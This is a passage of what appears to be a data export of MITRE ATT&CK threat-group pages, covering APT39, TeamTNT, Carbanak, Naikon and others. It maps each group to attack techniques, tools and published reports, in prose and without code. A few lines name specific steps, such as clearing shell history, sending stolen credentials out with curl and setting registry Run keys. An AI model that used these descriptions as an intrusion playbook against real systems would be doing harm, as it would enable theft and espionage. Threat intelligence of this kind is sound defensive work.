code.[8][9] .005 Visual Basic APT39 has utilized malicious VBS scripts in malware.[3] .006 Python APT39 has used a command line utility and a network scanner written in python.[8][3] .010 AutoHotKey & AutoIT APT39 has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links.[3] Enterprise T1136 .001 Create Account: Local Account APT39 has created accounts on multiple compromised hosts to perform actions within the network.[8] Enterprise T1555 Credentials from Password Stores APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords.[8] Enterprise T1005 Data from Local System APT39 has used various tools to steal files from the compromised host.[9][3] Enterprise T1074 .001 Data Staged: Local Data Staging APT39 has utilized tools to aggregate data prior to exfiltration.[3] Enterprise T1140 Deobfuscate/Decode Files or Information APT39 has used malware to decrypt encrypted CAB files.[3] Enterprise T1546 .010 Event Triggered Execution: AppInit DLLs APT39 has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows in order to establish persistence.[3] Enterprise T1041 Exfiltration Over C2 Channel APT39 has exfiltrated stolen victim data through C2 communications.[3] Enterprise T1190 Exploit Public-Facing Application APT39 has used SQL injection for initial compromise.[9] Enterprise T1083 File and Directory Discovery APT39 has used tools with the ability to search for files on a compromised host.[3] Enterprise T1070 .004 Indicator Removal: File Deletion APT39 has used malware to delete files after they are deployed on a compromised host.[3] Enterprise T1105 Ingress Tool Transfer APT39 has downloaded tools to compromised hosts.[9][3] Enterprise T1056 Input Capture APT39 has utilized tools to capture mouse movements.[3] .001 Keylogging APT39 has used tools for capturing keystrokes.[9][3] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.[8][3] Enterprise T1046 Network Service Discovery APT39 has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning.[1][8] Enterprise T1135 Network Share Discovery APT39 has used the post exploitation tool CrackMapExec to enumerate network shares.[8] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.[1][8] .013 Obfuscated Files or Information: Encrypted/Encoded File APT39 has used malware to drop encrypted CAB files.[3] Enterprise T1588 .002 Obtain Capabilities: Tool APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.[8][10] Enterprise T1003 OS Credential Dumping APT39 has used different versions of Mimikatz to obtain credentials.[8] .001 LSASS Memory APT39 has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT39 leveraged spearphishing emails with malicious attachments to initially compromise victims.[1][9][3] .002 Phishing: Spearphishing Link APT39 leveraged spearphishing emails with malicious links to initially compromise victims.[1][3] Enterprise T1090 .001 Proxy: Internal Proxy APT39 used custom tools to create SOCK5 and custom protocol proxies between infected hosts.[1][8] .002 Proxy: External Proxy APT39 has used various tools to proxy C2 communications.[8] Enterprise T1012 Query Registry APT39 has used various strains of malware to query the Registry.[3] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol APT39 has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.[1][8] .002 Remote Services: SMB/Windows Admin Shares APT39 has used SMB for lateral movement.[9] .004 Remote Services: SSH APT39 used secure shell (SSH) to move laterally among their targets.[1] Enterprise T1018 Remote System Discovery APT39 has used NBTscan and custom tools to discover remote systems.[1][8][9] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT39 has created scheduled tasks for persistence.[1][8][3] Enterprise T1113 Screen Capture APT39 has used a screen capture utility to take screenshots on a compromised host.[9][3] Enterprise T1505 .003 Server Software Component: Web Shell APT39 has installed ANTAK and ASPXSPY web shells.[1] Enterprise T1553 .006 Subvert Trust Controls: Code Signing Policy Modification APT39 has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows.[3] Enterprise T1033 System Owner/User Discovery APT39 used Remexi to collect usernames from the system.[2] Enterprise T1569 .002 System Services: Service Execution APT39 has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.[8][9] Enterprise T1204 .001 User Execution: Malicious Link APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious link.[1][3] .002 User Execution: Malicious File APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.[1][8][9][3] Enterprise T1078 Valid Accounts APT39 has used stolen credentials to compromise Outlook Web Access (OWA).[1] Enterprise T1102 .002 Web Service: Bidirectional Communication APT39 has communicated with C2 through files uploaded to and downloaded from DropBox.[8] Software ID Name References Techniques S0073 ASPXSpy [1] Server Software Component: Web Shell S0454 Cadelspy [2] Application Window Discovery, Archive Collected Data, Audio Capture, Clipboard Data, Input Capture: Keylogging, Peripheral Device Discovery, Screen Capture, System Information Discovery S0488 CrackMapExec [1][8] Account Discovery: Domain Account, Brute Force: Password Spraying, Brute Force: Password Guessing, Brute Force, Command and Scripting Interpreter: PowerShell, File and Directory Discovery, Modify Registry, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, OS Credential Dumping: LSA Secrets, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, Scheduled Task/Job: At, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0095 ftp [3] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0459 MechaFlounder [11] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Python, Data Encoding: Standard Encoding, Exfiltration Over C2 Channel, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, System Owner/User Discovery S0002 Mimikatz [1][8][6][9] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0590 NBTscan [1] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0029 PsExec [1][8][9] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0006 pwdump [9] OS Credential Dumping: Security Account Manager S0375 Remexi [2][12][9] Application Layer Protocol: Web Protocols, Application Window Discovery, Archive Collected Data, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Winlogon Helper DLL, Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, File and Directory Discovery, Input Capture: Keylogging, Obfuscated Files or Information: Encrypted/Encoded File, Scheduled Task/Job: Scheduled Task, Screen Capture, Windows Management Instrumentation S0005 Windows Credential Editor [1][6] OS Credential Dumping: LSASS Memory References Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. Symantec Security Response. (2015, December 7). Iran-based attackers use back door threats to spy on Middle Eastern targets. Retrieved April 17, 2019. FBI. (2020, September 17). Indicators of Compromise Associated with Rana Intelligence Computing, also known as Advanced Persistent Threat 39, Chafer, Cadelspy, Remexi, and ITG07. Retrieved December 10, 2020. Dept. of Treasury. (2020, September 17). Treasury Sanctions Cyber Actors Backed by Iranian Intelligence. Retrieved December 10, 2020. DOJ. (2020, September 17). Department of Justice and Partner Departments and Agencies Conduct Coordinated Actions to Disrupt and Deter Iranian Malicious Cyber Activities Targeting the United States and the Broader International Community. Retrieved December 10, 2020. Higgins, K. (2019, January 30). Iran Ups its Traditional Cyber Espionage Tradecraft. Retrieved May 22, 2020. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. Rusu, B. (2020, May 21). Iranian Chafer APT Targeted Air Transportation and Government in Kuwait and Saudi Arabia. Retrieved May 22, 2020. Symantec. (2018, February 28). Chafer: Latest Attacks Reveal Heightened Ambitions. Retrieved May 22, 2020. McMillen, D. Sperry, C. (2019, June 14). Observations of ITG07 Cyber Operations. Retrieved May 17, 2021. Falcone, R. (2019, March 4). New Python-Based Payload MechaFlounder Used by Chafer. Retrieved May 27, 2020. Legezo, D. (2019, January 30). Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities. Retrieved April 17, 2019. "
},
{
"id": 57,
"title": "The White Company, Group G0089",
"path": "/groups/G0089/index.html",
"content": " The White Company The White Company is a likely state-sponsored threat actor with advanced capabilities. From 2017 through 2018, the group led an espionage campaign called Operation Shaheen targeting government and military organizations in Pakistan.[1] ID: G0089 Version: 1.1 Created: 02 May 2019 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1203 Exploitation for Client Execution The White Company has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.[1] Enterprise T1070 .004 Indicator Removal: File Deletion The White Company has the ability to delete its malware entirely from the target system.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing The White Company has obfuscated their payloads through packing.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment The White Company has sent phishing emails with malicious Microsoft Word attachments to victims.[1] Enterprise T1518 .001 Software Discovery: Security Software Discovery The White Company has checked for specific antivirus products on the target\u2019s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.[1] Enterprise T1124 System Time Discovery The White Company has checked the current date on the victim system.[1] Enterprise T1204 .002 User Execution: Malicious File The White Company has used phishing lure documents that trick users into opening them and infecting their computers.[1] Software ID Name References Techniques S0198 NETWIRE [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Archive Collected Data: Archive via Custom Method, Archive Collected Data, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: XDG Autostart Entries, Boot or Logon Autostart Execution: Login Items, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Launch Agent, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Invalid Code Signature, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Obfuscated Files or Information: Fileless Storage, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Process Injection: Process Hollowing, Proxy, Scheduled Task/Job: Cron, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, User Execution: Malicious File, User Execution: Malicious Link, Web Service S0379 Revenge RAT [1] Audio Capture, Boot or Logon Autostart Execution: Winlogon Helper DLL, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Indirect Command Execution, Ingress Tool Transfer, Input Capture: Keylogging, OS Credential Dumping, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Screen Capture, System Binary Proxy Execution: Mshta, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Video Capture, Web Service: Bidirectional Communication References Livelli, K, et al. (2018, November 12). Operation Shaheen. Retrieved May 1, 2019. "
},
{
"id": 58,
"title": "TeamTNT, Group G0139",
"path": "/groups/G0139/index.html",
"content": " TeamTNT TeamTNT is a threat group that has primarily targeted cloud and containerized environments. The group as been active since at least October 2019 and has mainly focused its efforts on leveraging cloud and container resources to deploy cryptocurrency miners in victim environments.[1][2][3][4][5][6][7][8][9] ID: G0139 Contributors: Will Thomas, Cyjax; Darin Smith, Cisco Version: 1.3 Created: 01 October 2021 Last Modified: 16 September 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1098 .004 Account Manipulation: SSH Authorized Keys TeamTNT has added RSA keys in authorized_keys.[8][10] Enterprise T1583 .001 Acquire Infrastructure: Domains TeamTNT has obtained domains to host their payloads.[1] Enterprise T1595 .001 Active Scanning: Scanning IP Blocks TeamTNT has scanned specific lists of target IP addresses.[6] .002 Active Scanning: Vulnerability Scanning TeamTNT has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.[6] Enterprise T1071 Application Layer Protocol TeamTNT has used an IRC bot for C2 communications.[6] .001 Web Protocols TeamTNT has the curl command to send credentials over HTTP and the curl and wget commands to download new software.[3][4][10] TeamTNT has also used a custom user agent HTTP header in shell scripts.[6] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder TeamTNT has added batch scripts to the startup folder.[7] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell TeamTNT has executed PowerShell commands in batch scripts.[7] .003 Command and Scripting Interpreter: Windows Command Shell TeamTNT has used batch scripts to download tools and executing cryptocurrency miners.[7] .004 Command and Scripting Interpreter: Unix Shell TeamTNT has used shell scripts for execution.[6][10] .009 Command and Scripting Interpreter: Cloud API TeamTNT has leveraged AWS CLI to enumerate cloud environments with compromised credentials.[11] Enterprise T1609 Container Administration Command TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.[5] Enterprise T1613 Container and Resource Discovery TeamTNT has checked for running containers with docker ps and for specific container names with docker inspect.[6] TeamTNT has also searched for Kubernetes pods running in a local network.[10] Enterprise T1136 .001 Create Account: Local Account TeamTNT has created local privileged users on victim machines.[3] Enterprise T1543 .002 Create or Modify System Process: Systemd Service TeamTNT has established persistence through the creation of a cryptocurrency mining system service using systemctl.[6][10] .003 Create or Modify System Process: Windows Service TeamTNT has used malware that adds cryptocurrency miners as a service.[7] Enterprise T1074 .001 Data Staged: Local Data Staging TeamTNT has aggregated collected credentials in text files before exfiltrating.[10] Enterprise T1140 Deobfuscate/Decode Files or Information TeamTNT has used a script that decodes a Base64-encoded version of WeaveWorks Scope.[10] Enterprise T1610 Deploy Container TeamTNT has deployed different types of containers into victim environments to facilitate execution.[3][6] TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.[10] Enterprise T1587 .001 Develop Capabilities: Malware TeamTNT has developed custom malware such as Hildegard.[5] Enterprise T1611 Escape to Host TeamTNT has deployed privileged containers that mount the filesystem of victim machine.[3][8] Enterprise T1048 Exfiltration Over Alternative Protocol TeamTNT has sent locally staged files with collected credentials to C2 servers using cURL.[10] Enterprise T1133 External Remote Services TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments.[3][10] TeamTNT has also targeted exposed kubelets for Kubernetes environments.[5] Enterprise T1083 File and Directory Discovery TeamTNT has used a script that checks /proc/*/environ for environment variables related to AWS.[10] Enterprise T1222 .002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification TeamTNT has modified the permissions on binaries with chattr.[6][10] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools TeamTNT has disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure.[7][10] .004 Impair Defenses: Disable or Modify System Firewall TeamTNT has disabled iptables.[8] Enterprise T1070 .002 Indicator Removal: Clear Linux or Mac System Logs TeamTNT has removed system logs from /var/log/syslog.[8] .003 Indicator Removal: Clear Command History TeamTNT has cleared command history with history -c.[6][10] .004 Indicator Removal: File Deletion TeamTNT has used a payload that removes itself after running. TeamTNT also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.[7][10] Enterprise T1105 Ingress Tool Transfer TeamTNT has the curl and wget commands as well as batch scripts to download new tools.[3][10] Enterprise T1036 Masquerading TeamTNT has disguised their scripts with docker-related file names.[10] .005 Match Legitimate Resource Name or Location TeamTNT has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software.[10] Enterprise T1046 Network Service Discovery TeamTNT has used masscan to search for open Docker API ports and Kubernetes clusters.[4][5][10] TeamTNT has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing TeamTNT has used UPX and Ezuri packer to pack its binaries.[6] .013 Obfuscated Files or Information: Encrypted/Encoded File TeamTNT has encrypted its binaries via AES and encoded files using Base64.[6][8] Enterprise T1120 Peripheral Device Discovery TeamTNT has searched for attached VGA devices using lspci.[10] Enterprise T1057 Process Discovery TeamTNT has searched for rival malware and removes it if found.[6] TeamTNT has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.[10] Enterprise T1219 Remote Access Tools TeamTNT has established tmate sessions for C2 communications.[5][10] Enterprise T1021 .004 Remote Services: SSH TeamTNT has used SSH to connect back to victim machines.[3] TeamTNT has also used SSH to transfer tools and payloads onto victim hosts and execute them.[10] Enterprise T1496 .001 Resource Hijacking: Compute Hijacking TeamTNT has deployed XMRig Docker images to mine cryptocurrency.[2][4] TeamTNT has also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency.[10] Enterprise T1014 Rootkit TeamTNT has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine.[6] [10] Enterprise T1518 .001 Software Discovery: Security Software Discovery TeamTNT has searched for security products on infected machines.[7][10] Enterprise T1608 .001 Stage Capabilities: Upload Malware TeamTNT has uploaded backdoored Docker images to Docker Hub.[2] Enterprise T1082 System Information Discovery TeamTNT has searched for system version, architecture, disk partition, logical volume, and hostname information.[7][10] Enterprise T1016 System Network Configuration Discovery TeamTNT has enumerated the host machine\u2019s IP address.[6] Enterprise T1049 System Network Connections Discovery TeamTNT has run netstat -anp to search for rival malware connections.[6] TeamTNT has also used libprocesshider to modify /etc/ld.so.preload.[7] Enterprise T1007 System Service Discovery TeamTNT has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them.[10] Enterprise T1569 .003 System Services: Systemctl TeamTNT has created system services to execute cryptocurrency mining software.[10] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files TeamTNT has searched for unsecured AWS credentials and Docker API credentials.[4][6][10] .004 Unsecured Credentials: Private Keys TeamTNT has searched for unsecured SSH keys.[4][6] .005 Unsecured Credentials: Cloud Instance Metadata API TeamTNT has queried the AWS instance metadata service for credentials.[6][10] Enterprise T1204 .003 User Execution: Malicious Image TeamTNT has relied on users to download and execute malicious Docker images.[2] Enterprise T1102 Web Service TeamTNT has leveraged iplogger.org to send collected data back to C2.[8][10] Software ID Name References Techniques S0601 Hildegard [5] Application Layer Protocol, Command and Scripting Interpreter: Unix Shell, Container Administration Command, Container and Resource Discovery, Create Account: Local Account, Create or Modify System Process: Systemd Service, Deobfuscate/Decode Files or Information, Escape to Host, Exploitation for Privilege Escalation, External Remote Services, Hijack Execution Flow: Dynamic Linker Hijacking, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Indicator Removal: Clear Command History, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Network Service Discovery, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, Remote Access Tools, Resource Hijacking: Compute Hijacking, Rootkit, System Information Discovery, Unsecured Credentials: Private Keys, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Cloud Instance Metadata API, Web Service S0349 LaZagne [7] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0179 MimiPenguin [1] OS Credential Dumping: Proc Filesystem S0683 Peirates [12] Cloud Storage Object Discovery, Container Administration Command, Container and Resource Discovery, Data from Cloud Storage, Deploy Container, Escape to Host, Network Service Discovery, Steal Application Access Token, Unsecured Credentials: Container API, Unsecured Credentials: Cloud Instance Metadata API, Use Alternate Authentication Material: Application Access Token, Valid Accounts: Cloud Accounts References Quist, N. (2020, October 5). Black-T: New Cryptojacking Variant from TeamTNT. Retrieved September 22, 2021. Stroud, J. (2021, May 25). Taking TeamTNT's Docker Images Offline. Retrieved September 16, 2024. Fishbein, N. (2020, September 8). Attackers Abusing Legitimate Cloud Monitoring Tools to Conduct Cyber Attacks. Retrieved September 22, 2021. Cado Security. (2020, August 16). Team TNT \u2013 The First Crypto-Mining Worm to Steal AWS Credentials. Retrieved September 22, 2021. Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes. Retrieved April 5, 2021. Fiser, D. Oliveira, A. (n.d.). Tracking the Activities of TeamTNT A Closer Look at a Cloud-Focused Malicious Actor Group. Retrieved September 22, 2021. AT&T Alien Labs. (2021, September 8). TeamTNT with new campaign aka Chimaera. Retrieved September 22, 2021. Kol, Roi. Morag, A. (2020, August 25). Deep Analysis of TeamTNT Techniques Using Container Images to Attack. Retrieved September 22, 2021. Intezer. (2021, September 1). TeamTNT Cryptomining Explosion. Retrieved October 15, 2021. Darin Smith. (2022, April 21). TeamTNT targeting AWS, Alibaba. Retrieved August 4, 2022. Darin Smith. (2022, April 21). TeamTNT targeting AWS, Alibaba. Retrieved July 8, 2022. Nathaniel Quist. (2021, June 4). TeamTNT Actively Enumerating Cloud Environments to Infiltrate Organizations. Retrieved February 8, 2022. "
},
{
"id": 59,
"title": "Carbanak, Anunak, Group G0008",
"path": "/groups/G0008/index.html",
"content": " Carbanak Carbanak is a cybercriminal group that has used Carbanak malware to target financial institutions since at least 2013. Carbanak may be linked to groups tracked separately as Cobalt Group and FIN7 that have also used Carbanak malware.[1][2][3][4][5] ID: G0008 \u24d8 Associated Groups: Anunak Contributors: Anastasios Pingios Version: 2.0 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Anunak [6] Techniques Used Domain ID Name Use Enterprise T1543 .003 Create or Modify System Process: Windows Service Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges.[1] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall Carbanak may use netsh to add local firewall rule exceptions.[7] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Carbanak has copied legitimate service names to use for malicious services.[1] .005 Masquerading: Match Legitimate Resource Name or Location Carbanak has named malware \"svchost.exe,\" which is the name of the Windows shared service host program.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Carbanak has obtained and used open-source tools such as PsExec and Mimikatz.[1] Enterprise T1219 Remote Access Tools Carbanak used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.[7] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 Carbanak installs VNC server software that executes through rundll32.[1] Enterprise T1078 Valid Accounts Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[1] Enterprise T1102 .002 Web Service: Bidirectional Communication Carbanak has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.[8] Software ID Name References Techniques S0030 Carbanak [1] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create Account: Local Account, Data Encoding: Standard Encoding, Data Transfer Size Limits, Email Collection: Local Email Collection, Encrypted Channel: Symmetric Cryptography, Indicator Removal: File Deletion, Input Capture: Keylogging, Obfuscated Files or Information, OS Credential Dumping, Process Discovery, Process Injection: Portable Executable Injection, Query Registry, Remote Access Tools, Remote Services: Remote Desktop Protocol, Screen Capture S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0108 netsh [7] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution References Kaspersky Lab's Global Research and Analysis Team. (2015, February). CARBANAK APT THE GREAT BANK ROBBERY. Retrieved August 23, 2018. Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017. Europol. (2018, March 26). Mastermind Behind EUR 1 Billion Cyber Bank Robbery Arrested in Spain. Retrieved October 10, 2018. CTU. (n.d.). GOLD NIAGARA. Retrieved September 21, 2021. Secureworks. (n.d.). GOLD KINGSWOOD. Retrieved October 18, 2021. Prins, R. (2015, February 16). Anunak (aka Carbanak) Update. Retrieved January 20, 2017. Group-IB and Fox-IT. (2014, December). Anunak: APT against financial institutions. Retrieved April 20, 2016. Griffin, N. (2017, January 17). CARBANAK GROUP USES GOOGLE FOR MALWARE COMMAND-AND-CONTROL. Retrieved February 15, 2017. "
},
{
"id": 60,
"title": "Putter Panda, APT2, MSUpdater, Group G0024",
"path": "/groups/G0024/index.html",
"content": " Putter Panda Putter Panda is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA\u2019s 3rd General Staff Department (GSD). [1] ID: G0024 \u24d8 Associated Groups: APT2, MSUpdater Version: 1.2 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description APT2 [2] MSUpdater [1] Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder A dropper used by Putter Panda installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 \u2013 0xAF to obfuscate payloads.[1] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).[1] Software ID Name References Techniques S0066 3PARA RAT [1] Application Layer Protocol: Web Protocols, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: Timestomp S0065 4H RAT [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Process Discovery, System Information Discovery S0068 httpclient [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography S0067 pngdowner [1] Application Layer Protocol: Web Protocols, Indicator Removal: File Deletion, Unsecured Credentials: Credentials In Files References Crowdstrike Global Intelligence Team. (2014, June 9). CrowdStrike Intelligence Report: Putter Panda. Retrieved January 22, 2016. Gross, J. and Walter, J.. (2016, January 12). Puttering into the Future.... Retrieved November 17, 2024. "
},
{
"id": 61,
"title": "Naikon, Group G0019",
"path": "/groups/G0019/index.html",
"content": " Naikon Naikon is assessed to be a state-sponsored cyber espionage group attributed to the Chinese People\u2019s Liberation Army\u2019s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau (Military Unit Cover Designator 78020).[1] Active since at least 2010, Naikon has primarily conducted operations against government, military, and civil organizations in Southeast Asia, as well as against international bodies such as the United Nations Development Programme (UNDP) and the Association of Southeast Asian Nations (ASEAN).[1][2] While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches.[3] ID: G0019 Contributors: Kyaw Pyiyt Htet, @KyawPyiytHtet Version: 2.0 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Naikon has modified a victim's Windows Run registry to establish persistence.[4] Enterprise T1574 .001 Hijack Execution Flow: DLL Naikon has used DLL side-loading to load malicious DLL's into legitimate executables.[5] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Naikon renamed a malicious service taskmgr to appear to be a legitimate version of Task Manager.[4] .005 Masquerading: Match Legitimate Resource Name or Location Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables.[4] Enterprise T1046 Network Service Discovery Naikon has used the LadonGo scanner to scan target networks.[4] Enterprise T1137 .006 Office Application Startup: Add-ins Naikon has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host.[5] Enterprise T1566 .001 Phishing: Spearphishing Attachment Naikon has used malicious e-mail attachments to deliver malware.[5] Enterprise T1018 Remote System Discovery Naikon has used a netbios scanner for remote machine identification.[4] Enterprise T1053 .005 